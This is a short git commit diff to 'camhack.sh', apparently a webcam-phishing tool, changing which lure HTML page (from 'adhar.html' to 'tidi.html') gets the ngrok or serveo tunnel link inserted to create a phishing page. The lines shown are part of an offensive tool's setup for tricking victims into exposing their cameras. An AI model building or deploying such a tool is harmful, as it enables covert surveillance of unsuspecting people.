87c19bbdd4ef9264c8dff1c2e89d79f22fb8c671
praveenkumar-ctrl <70391240+praveenkumar-ctrl@users.noreply.github.com>
2021-03-30 10:22:14 +0530

    add

--- camhack.sh
+++ camhack.sh
@@ -151,7 +151,7 @@ printf '\e[1;93m[\e[0m\e[1;77m+\e[0m\e[1;93m] Direct link:\e[0m\e[1;77m %s\n' $s
 payload_ngrok() {
 
 link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[0-9a-z]*\.ngrok.io")
-sed 's+forwarding_link+'$link'+g' adhar.html > skhisha.html
+sed 's+forwarding_link+'$link'+g' tidi.html > skhisha.html
 sed 's+forwarding_link+'$link'+g' template.php > index.php
 
 
@@ -239,7 +239,7 @@ payload() {
 
 send_link=$(grep -o "https://[0-9a-z]*\.serveo.net" sendlink)
 
-sed 's+forwarding_link+'$send_link'+g' adhar.html > skhisha.html
+sed 's+forwarding_link+'$send_link'+g' tidi.html > skhisha.html
 sed 's+forwarding_link+'$send_link'+g' template.php > index.php
 
 
